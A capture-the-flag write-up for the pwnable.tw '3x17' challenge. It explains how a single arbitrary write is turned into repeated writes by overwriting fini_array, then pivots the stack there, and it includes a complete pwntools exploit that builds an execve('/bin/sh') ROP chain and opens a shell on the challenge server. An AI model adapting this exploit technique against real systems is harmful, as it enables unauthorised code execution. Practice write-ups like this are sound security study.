@@ -1,0 +1,91 @@
+<!--Solve date: 06/16/2022-->
+
+<h1>pwnable.tw - 3x17</h1>
+
+<h2>150 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<p>This is a statically-linked 64-bit ELF binary. The <code>main()</code> subroutine increments a global counter variable, checks whether its <i>least significant byte</i> is equal to <code>1</code>. If not, <code>main()</code> immediately returns. Otherwise, the binary prompts for an address, input as a string, and reads <code>24</code> bytes of data to that address. This is basically a <i>write-what-where</i> (W-W-W) primitive, but at first glance, not a very useful one since we only have one opportunity to write.</p>
+
+<img src = "./images/pwnable_3x17_1.png"/>
+
+<p>Thus, our first step will be to run <code>main()</code> on an infinite loop. Even though the counter variable will not be the correct value most of the time - meaning we are not able to get arbitrary write on those iterations - an infinite loop on <code>main()</code> means that we will get arbitrary write every <code>256</code> iterations (the period of the least significant byte), which is sufficiently frequent. The way to obtain an infinite loop is via <code>fini_array</code>, which used to be referred to as <code>.dtors</code>. This is a list of pointers to destructor (hence the name) functions that are called after the program finishes running. The function that calls the functions in this array is depicted below.</p>
+
+<img class = "small" src = "./images/pwnable_3x17_2.png"/>
+
+<p>This function starts by calculating the number of quadword entries in the array by subtracting the array start address from the address of the entry just after the end, then dividing by <code>8</code>. Then, using <code>rbx</code> as a counter, the functions are called subsequently starting from the end and proceeding backwards.</p>
+
+<p>Note that in this implementation, the number of addresses in <code>fini_array</code> is fixed. (Previously in the case of <code>.dtors</code>, the destructor array did not have fixed length but was rather terminated by a null pointer.) This means we can only call as many functions as is initially present - in this case, only two.</p>
+
+<p>A first idea is to write <code>main()</code> directly to the <code>fini_array</code>. This clearly will not succeed, since we could only get at most two executions of <code>main()</code> before the list is exhausted. Furthermore, none of the additional runs will even allow use of the W-W-W primitive, since the lowest byte of the counter will not have returned to zero. Another idea is to write <code>_start</code> to the <code>fini_array</code>, with the idea that by starting at the entrypoint of the entire binary, the entire program state will be reset: the global counter read by <code>main()</code> will be set to zero and the overwritten <code>fini_array</code>, still pointing to <code>_start</code>, will be called on repeat. Unfortunately, this fails as well because <code>_start</code> expects a particular layout of the stack that is passed to <code>__libc_start_main</code>, and an improper layout results in segmentation fault.</p>
+
+<p>A creative solution is to write the address of the function that calls <code>fini_array</code> <i>itself</i> to the <code>fini_array</code>. In particular, consider writing the caller of <code>fini_array</code> followed by <code>main()</code>. The caller first runs <code>main()</code> (which simply updates the counter and returns, since the counter is wrong), then <i>calls itself</i> - which calls <code>main()</code> (again updating the counter and returning) and again calls itself, <i>ad infinitum</i>. Every 256 calls, <code>main()</code> runs the W-W-W primitive, and thus we have multiple arbitrary write. Note that this only works because we have two entries in the <code>fini_array</code>; if there were only one, then this strategy would not work.</p>
+
+<p>With multiple arbitrary write, we can now craft a payload to spawn a shell. The next problem is that we do not know the address of the stack, so it is impossible to know where to put a ROP payload. Here, we can take advantage of the fact that in the function that calls <code>fini_array</code>, <code>rbp</code> points to the <code>fini_array</code> itself, rather than an arbitrary stack location. Therefore, a good strategy is to <i>pivot the stack</i> to <code>fini_array</code> and put the ROP payload there. A gadget such as <code>leave; ret</code> would point <code>rsp</code> to <code>fini_array</code>, pop the address there (which is now the function that calls <code>fini_array</code> - but we don't really care) into <code>rbp</code>, and return to the next address, which is <code>main()</code>. After <code>main()</code> completes, the ROP payload will be executed.</p>
+
+<h4>Payload</h4>
+
+<pre class = "Python">
+
+from pwn import *
+
+#p = process("./3x17")
+#gdb.attach(p, gdbscript = """
+#    b *0x401c2e
+#""")
+p = remote("chall.pwnable.tw", 10105)
+
+#start = 0x401a50
+main = 0x401b6d
+leave_ret = 0x401c4b
+poprdi_ret = 0x40295a
+call_fini = 0x402960
+poprax_ret = 0x41e4af
+poprdx_poprsi_ret = 0x44a309
+syscall_ret = 0x471db5
+fini_array = 0x4b40f0
+
+
+rec = lambda: p.recv()
+sendnl = lambda x: p.send(x)
+sendl = lambda x: p.sendline(x)
+sendnuml = lambda x: sendl(bytes(str(x), "utf-8"))
+
+
+rec()
+sendnuml(fini_array)
+#sendnuml(0x4b4100)                      #
+rec()
+sendnl(p64(call_fini) + p64(main))
+#sendl(p64(0xdeadbeef))                  #
+
+rec()
+sendnuml(fini_array + 0x10)
+rec()
+sendnl(p64(poprdi_ret) + p64(fini_array + 0x50) + p64(poprdx_poprsi_ret))
+
+rec()
+sendnuml(fini_array + 0x28)
+rec()
+sendnl(p64(0) + p64(0) + p64(poprax_ret))
+
+rec()
+sendnuml(fini_array + 0x40)
+rec()
+sendnl(p64(0x3b) + p64(syscall_ret) + b"/bin/sh\x00")
+
+# now, overwrite fini again, this time pivoting stack
+rec()
+sendnuml(fini_array)
+rec()
+sendnl(p64(leave_ret))
+
+p.interactive()
+</pre>
+
+<h4>Flag (SHA-256)</h4>
+
+<p><code>fb4cf45fd29c69d74314016306defe9279e9e879f9767cd7cac7be59be3bdeb9</code></p>
